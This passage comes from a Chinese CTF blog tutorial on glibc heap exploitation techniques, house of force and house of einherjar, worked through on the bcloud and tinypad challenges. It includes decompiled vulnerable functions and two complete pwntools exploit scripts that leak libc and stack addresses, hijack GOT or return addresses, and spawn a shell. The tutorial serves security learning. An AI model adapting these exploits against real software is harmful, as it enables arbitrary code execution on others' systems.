%d\n&quot;, i);</div><div class="line">  result = i;</div><div class="line">  dword_804B0E0[i] = 0;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在new函数中，可以控制malloc的size大小，然后我们需要考虑控制malloc跳到哪里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int edit()</div><div class="line">&#123;</div><div class="line">  int length;</div><div class="line">  int id; // [esp+14h] [ebp-14h]</div><div class="line">  int note; // [esp+18h] [ebp-10h]</div><div class="line"></div><div class="line">  puts(&quot;Input the id:&quot;);</div><div class="line">  id = get_int();</div><div class="line">  if ( id &lt; 0 || id &gt; 9 )</div><div class="line">    return puts(&quot;Invalid ID.&quot;);</div><div class="line">  note = note_list[id];</div><div class="line">  if ( !note )</div><div class="line">    return puts(&quot;Note has been deleted.&quot;);</div><div class="line">  length = note_length[id];</div><div class="line">  dword_804B0E0[id] = 0;</div><div class="line">  puts(&quot;Input the new content:&quot;);</div><div class="line">  read_buffer(note, length, 10);</div><div class="line">  return puts(&quot;Edit success.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>有一个edit函数，可以编辑note_list指向地址的值，所以如果我们能控制note_list的值，就可以做到任意地址修改</p>
<p>所以我们的目的是让下一次malloc的返回值为<code>0x804B120</code>，这样需要在这一次malloc后，让<code>top_chunk=0x804B118</code></p>
<p>所以根据泄露出的heap地址计算出当前top_chunk的地址，然后再计算出本次malloc的size: <code>0x10804B118-top_chunk</code> 或者 <code>-(top_chunk-0x804B118)</code></p>
<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>按照该程序的逻辑，应该在show函数中成输出note_list指向地址的值，但是该函数的功能还未实现:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int show()</div><div class="line">&#123;</div><div class="line">  return puts(&quot;WTF? Something strange happened.&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以就需要想别的办法来泄露libc地址了</p>
<p>我使用的方法的修改free_got的值为printf的值，然后在delete函数中，<code>free(note_list[x])</code>，<code>note_list[x]</code>修改成atoi_got的地址，这样就能泄露出atoi_got的值</p>
<p>但是因为不知道libc，所以不知道printf的值，但是因为有延时绑定，所以我们能把free_got的值修改成printf_plt+6的值</p>
<p>获取到libc的地址后，可以计算出system的值，然后再把atoi_got的值修改成system地址，达到getshell的目的</p>
<p>完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2.7</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def new_note(len,content):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(str(len))</div><div class="line">    p.readuntil(&quot;content:&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def edit_note(i, data):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line">    p.readuntil(&quot;content:\n&quot;)</div><div class="line">    p.sendline(data)</div><div class="line">    p.readuntil(&quot;success.&quot;)</div><div class="line"></div><div class="line">def delete_note(i):</div><div class="line">    p.readuntil(&quot;---&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;id:\n&quot;)</div><div class="line">    p.sendline(str(i))</div><div class="line"></div><div class="line">p = process(&quot;./bcloud&quot;)</div><div class="line">e = ELF(&quot;./bcloud&quot;)</div><div class="line">libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line"># leak heap</div><div class="line">p.readuntil(&quot;name:\n&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.read(0x44)</div><div class="line">heap = u32(p.read(4))</div><div class="line">print &quot;heap addr: &quot; + hex(heap)</div><div class="line"></div><div class="line"># modify top chunk size to 0xffffffff</div><div class="line">p.readuntil(&quot;Org:&quot;)</div><div class="line">p.send(&quot;a&quot;*0x40)</div><div class="line">p.readuntil(&quot;Host:&quot;)</div><div class="line">p.sendline(p32(0xffffffff))</div><div class="line">p.readuntil(&quot;Enjoy:&quot;)</div><div class="line"></div><div class="line"># malloc return address:0x804B120</div><div class="line">note_list = 0x804B120</div><div class="line">new_note(0x10, &quot;aaa&quot;)</div><div class="line">new_note(-(heap+0xf4-0x804B120+8), &quot;2333&quot;)</div><div class="line"></div><div class="line"># note_list[0] = free_got</div><div class="line"># note_list[1] = atoi_got</div><div class="line"># note_list[2] = atoi_got</div><div class="line">payload = p32(e.got[&quot;free&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">payload += p32(e.got[&quot;atoi&quot;])</div><div class="line">new_note(0x100, payload)</div><div class="line"></div><div class="line"># write printf address to free_got</div><div class="line">edit_note(0, p32(e.symbols[&quot;printf&quot;]+6))</div><div class="line"></div><div class="line"># printf(atoi_got)</div><div class="line">delete_note(1)</div><div class="line">atoi_libc = u32(p.read(4))</div><div class="line">p.readuntil(&quot;success.&quot;)</div><div class="line">libc_base = atoi_libc - libc.symbols[&quot;atoi&quot;]</div><div class="line">print &quot;libc_base: &quot; + hex(libc_base)</div><div class="line"></div><div class="line"># calculate system address</div><div class="line">system = libc.symbols[&quot;system&quot;] + libc_base</div><div class="line"></div><div class="line"># write system address to atoi_got</div><div class="line">edit_note(2, p32(system))</div><div class="line"></div><div class="line"># system(&quot;/bin/sh&quot;)</div><div class="line">p.sendline(&quot;/bin/sh&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>house of einherjar跟house of force差不多，最终目的都是控制top chunk的值，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c</a></p>
<p>题目见: <a href="https://github.com/blendin/writeups/tree/master/2016/tinypad" target="_blank" rel="external">https://github.com/blendin/writeups/tree/master/2016/tinypad</a></p>
<p>和house of force的区别是，通过off by one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top chunk进行合并操作的时候失败。</p>
<p>然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址。</p>
<p>接下来通过2016年Second ctf的一个题来加深对该利用方法的理解：</p>
<h2 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">&#123;</div><div class="line">    free(*(void **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">    *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] = 0LL;</div><div class="line">    writeln((__int64)&quot;\nDeleted.&quot;, 9LL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在free了一个tinypad的时候，只把size位置零了，但是却没有把储存content的地址(<code>tinypad[16 * (v11 - 1 + 16LL) + 8]</code>)置零</p>
<p>然后在每次循环的时候，都会输出四个tinypad的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 3; ++i )</div><div class="line">    &#123;</div><div class="line">      LOBYTE(c) = i + &apos;1&apos;;</div><div class="line">    writeln((__int64)&quot;+------------------------------------------------------------------------------+\n&quot;, 81LL);</div><div class="line">      write_n((__int64)&quot; #   INDEX: &quot;, 12LL);</div><div class="line">      writeln((__int64)&amp;c, 1LL);</div><div class="line">      write_n((__int64)&quot; # CONTENT: &quot;, 12LL);</div><div class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</div><div class="line">      &#123;</div><div class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</div><div class="line">        writeln(*(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8], v3);</div><div class="line">      &#125;</div><div class="line">      writeln((__int64)&amp;newline, 1LL);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>所以我们能增加4个tinypad，都申请一个0x100左右的chunk，然后释放第1个和第3个，这样就能形成unsortbin双链表，其中一个fd指向arena区域，一个fd指向另一个chunk，这样就泄露出了libc地址和堆地址</p>
<h2 id="house-of-einherjar利用"><a href="#house-of-einherjar利用" class="headerlink" title="house of einherjar利用"></a>house of einherjar利用</h2><p>首先是伪造一个合法的chunk，我们发现在edit分支，能控制<code>tinypad</code>地址的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if ( *(_QWORD *)&amp;tinypad[16 * (v11 - 1 + 16LL)] )</div><div class="line">        &#123;</div><div class="line">          c = &apos;0&apos;;</div><div class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">          while ( toupper(c) != &apos;Y&apos; )</div><div class="line">          &#123;</div><div class="line">            write_n((__int64)&quot;CONTENT: &quot;, 9LL);</div><div class="line">            v6 = strlen(tinypad);</div><div class="line">            writeln((__int64)tinypad, v6);</div><div class="line">            write_n((__int64)&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</div><div class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8]);</div><div class="line">            read_until((__int64)tinypad, v7, &apos;\n&apos;);        # 控制tinypad的值</div><div class="line">            writeln((__int64)&quot;Is it OK?&quot;, 9LL);</div><div class="line">            write_n((__int64)&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</div><div class="line">            read_until((__int64)&amp;c, 1uLL, 0xAu);</div><div class="line">          &#125;</div><div class="line">          strcpy(*(char **)&amp;tinypad[16 * (v11 - 1 + 16LL) + 8], tinypad);</div><div class="line">          writeln((__int64)&quot;\nEdited.&quot;, 8LL);</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>所以我们tinypad就是我们伪造的chunk，伪造的chunk如下：</p>
<p><code>&amp;tinypad</code>:</p>
<table>
<thead>
<tr>
<th style="text-align:center">pre_size(0x100)</th>
<th style="text-align:center">size(待会计算)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fwd(&amp;tinypad)</td>
<td style="text-align:center">bck(&amp;tinypad)</td>
</tr>
<tr>
<td style="text-align:center">fwd_nextsize(&amp;tinypad)</td>
<td style="text-align:center">bck_nextsize(&amp;tinypad)</td>
</tr>
</tbody>
</table>
<p>刚才泄露内存已经释放了两个tinypad，还剩第二个和第四个tinypad，这个时候我释放第四个tinypad，这样第三个第四个将会和top_chunk合并</p>
<p>只要经过精心计算，这个时候我们再add一个tinypad，将会获得第一个tinypad(已经被释放)的堆地址，然后利用off by one漏洞:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">unsigned __int64 read_until(__int64 buf, unsigned __int64 len, unsigned int end)</div><div class="line">&#123;</div><div class="line">  int v4; // [rsp+Ch] [rbp-34h]</div><div class="line">  unsigned __int64 i; // [rsp+28h] [rbp-18h]</div><div class="line">  signed __int64 v6; // [rsp+30h] [rbp-10h]</div><div class="line"></div><div class="line">  v4 = end;</div><div class="line">  for ( i = 0LL; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    v6 = read_n(0, buf + i, 1uLL);</div><div class="line">    if ( v6 &lt; 0 )</div><div class="line">      return -1LL;</div><div class="line">    if ( !v6 || *(char *)(buf + i) == v4 )</div><div class="line">      break;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(buf + i) = 0;           // off by one</div><div class="line">  if ( i == len &amp;&amp; *(_BYTE *)(len - 1 + buf) != 10 )</div><div class="line">    dummyinput(v4);</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>比如tinypad 1的大小是<code>0xf0</code>，我们申请一个<code>0xe8</code>大小的内存，就会得到tinypad 1的堆，然后可以覆盖到tinypad 2的<code>pre_size</code>，如果tinypad2的size位是0x101，则会被off by one漏洞设置为0x100</p>
<p>我们计算出tinypad2的地址，然后减去tinypad的地址，计算出offset，设置为tinypad2的pre_size和伪造chunk的size位</p>
<p>然后我们再free tinypad2，伪造的chunk和tinypad2将会和top chunk合并，这个时候top chunk的值为tinypad的地址</p>
<h2 id="bypass-Full-RELRO"><a href="#bypass-Full-RELRO" class="headerlink" title="bypass Full RELRO"></a>bypass Full RELRO</h2><p>top chunk已经被设置到tinypad地址了，tinypad+256地址开始储存着tinypad1 2 3 4的信息，所以当我们再次malloc的时候，tinypad 1 2 3 4的size和address都已经是可控的了，可以达到任意地址读，然后edit功能可以做到任意地址写</p>
<p>已经能任意地址读写了，正常思路就是写got表，然后getshell，但是发现程序开启了Full RELRO保护，got表将不可写</p>
<p>然后考虑了FILE_IO的利用方法，但是发现该程序的IO使用的都是read和write，并没有使用stdio库，故该思路也不可行</p>
<p>然后发现，在libc中有一个全局变量<code>__environ</code>, 储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，所以可以控制rip了</p>
<p>我使用的思路是，计算出one_gadget的地址，然后把<code>ret __libc_start_main</code>改写成<code>ret one_gadget</code>，从而达到getshell的目的。</p>
<p>完整Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">def add(p, size, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;a&quot;)</div><div class="line">    p.readuntil(&quot;(SIZE)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line">def delete(p, index):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;d&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index))</div><div class="line"></div><div class="line">def edit(p, index, content):</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;e&quot;)</div><div class="line">    p.readuntil(&quot;(INDEX)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(str(index)) </div><div class="line">    p.readuntil(&quot;(CONTENT)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(content)</div><div class="line">    p.readuntil(&quot;(Y/n)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;y&quot;)</div><div class="line"></div><div class="line">def main():</div><div class="line">    # context.log_level = &quot;debug&quot;</div><div class="line">    p = process(&quot;./tinypad&quot;)</div><div class="line">    # e = ELF(&quot;./tinypad&quot;)</div><div class="line">    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</div><div class="line"></div><div class="line">    # leak libc and heap address</div><div class="line">    add(p, 224, &quot;a&quot;*10)</div><div class="line">    add(p, 246, &quot;b&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;c&quot;*0xf0)</div><div class="line">    add(p, 256, &quot;d&quot;*10)</div><div class="line">    delete(p, 3)</div><div class="line">    delete(p, 1)</div><div class="line">    # get heap address</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    heap = p.readline().rstrip()</div><div class="line">    heap += &quot;\x00&quot;*(8-len(heap))</div><div class="line">    heap_base = u64(heap) - 0x1f0</div><div class="line">    print &quot;heap_base address: &quot; + hex(heap_base)</div><div class="line">    # get libc address</div><div class="line">    p.readuntil(&quot;INDEX: 3&quot;)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    libc_address = p.readline().strip()</div><div class="line">    libc_address += &quot;\x00&quot;*(8-len(libc_address))</div><div class="line">    libc_base = u64(libc_address) - 0x3c4b78</div><div class="line">    print &quot;libc_base address: &quot; + hex(libc_base)</div><div class="line"></div><div class="line">    # make top -&gt; tinypad(0x602040)</div><div class="line">    add(p, 232, &quot;g&quot;*224 + p64(heap_base+240-0x602040))</div><div class="line">    delete(p, 4)</div><div class="line">    payload = p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4</div><div class="line">    edit(p, 2, payload)</div><div class="line">    delete(p, 2)</div><div class="line"></div><div class="line">    # modify free_hook -&gt; one_gadget</div><div class="line">    gadget1 = 0xf1117</div><div class="line">    gadget2 = 0xf0274</div><div class="line">    gadget3 = 0xcd1c8</div><div class="line">    gadget4 = 0xcd0f3</div><div class="line">    gadget5 = 0x4526a</div><div class="line">    gadget6 = 0xf66c0</div><div class="line">    gadget_address = libc_base + gadget1</div><div class="line">    add(p, 0xe0, &quot;t&quot;*0xd0)</div><div class="line"></div><div class="line">    payload = p64(232) + p64(libc_base + libc.symbols[&quot;__environ&quot;])</div><div class="line">    payload += p64(232) + p64(0x602148)</div><div class="line">    add(p, 0x100, payload)</div><div class="line">    p.readuntil(&quot;# CONTENT: &quot;)</div><div class="line">    stack = p.read(6)</div><div class="line">    stack += &quot;\x00&quot;*(8-len(stack))</div><div class="line">    stack_env = u64(stack)</div><div class="line">    print &quot;env_stack address: &quot; + hex(stack_env)</div><div class="line">    # pause()</div><div class="line">    edit(p, 2, p64(stack_env-240))</div><div class="line">    edit(p, 1, p64(gadget_address))</div><div class="line">    p.readuntil(&quot;(CMD)&gt;&gt;&gt;&quot;)</div><div class="line">    p.sendline(&quot;Q&quot;)</div><div class="line">    p.interactive()</div><div class="line">    </div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇文章分析了</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
</ul>
<p>三种利用方法，还剩两种</p>
<ul>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<p>其中，<code>house_of_lore</code>没发现有具体的实例题目，所以暂时不做研究</p>
<p>而<code>house_of_orange</code>涉及的知识点过多，所以会单独写一篇</p>
<p>house of系列第一次出现是<code>Phrack</code>2009年的杂志上，一共出现了下面几种：</p>
<ul>
<li>The House of Mind</li>
<li>The House of Prime</li>
<li>The House of Spirit</li>
<li>The House of Force</li>
<li>The House of Lore</li>
</ul>
<p>最后三种在how2heap上都有，前面两种，下次再说</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a></li>
<li><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a></li>
<li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></li>
<li><a href="http://www.phrack.org/issues/66/10.html" target="_blank" rel="external">http://www.phrack.org/issues/66/10.html</a></li>
</ol>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/01/16/0x41/">Pwn学习之house of系列(一)</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
        <p><span>发布时间:</span>2018-01-16, 10:25:07</p>
        <p><span>最后更新:</span>2018-01-30, 17:58:50</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/01/16/0x41/" title="Pwn学习之house of系列(一)">http://0x48.pw/2018/01/16/0x41/</a>
            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2018/01/16/0x41/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>

            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2018/01/17/0x40/">
                    34c3 ctf simpleGC writeup
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2017/12/08/0x3F/">
                    CVE-2017-16943 Exim UAF漏洞分析--后续
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">1.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#泄露内存"><span class="toc-number">1.1.</span> <span class="toc-text">泄露内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用house-of-spirit进行任意地址写"><span class="toc-number">1.2.</span> <span class="toc-text">使用house_of_spirit进行任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最终利用"><span class="toc-number">1.3.</span> <span class="toc-text">最终利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">2.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#泄露堆地址"><span class="toc-number">2.1.</span> <span class="toc-text">泄露堆地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改top-chunk-size"><span class="toc-number">2.2.</span> <span class="toc-text">修改top_chunk size</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#控制malloc的返回值"><span class="toc-number">2.3.</span> <span class="toc-text">控制malloc的返回值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#泄露libc地址"><span class="toc-number">2.4.</span> <span class="toc-text">泄露libc地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">3.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#内存泄露"><span class="toc-number">3.1.</span> <span class="toc-text">内存泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-einherjar利用"><span class="toc-number">3.2.</span> <span class="toc-text">house of einherjar利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-Full-RELRO"><span class="toc-number">3.3.</span> <span class="toc-text">bypass Full RELRO</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>





    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/01/17/0x40/" title="上一篇: 34c3 ctf simpleGC writeup">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2017/12/08/0x3F/" title="下一篇: CVE-2017-16943 Exim UAF漏洞分析--后续">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

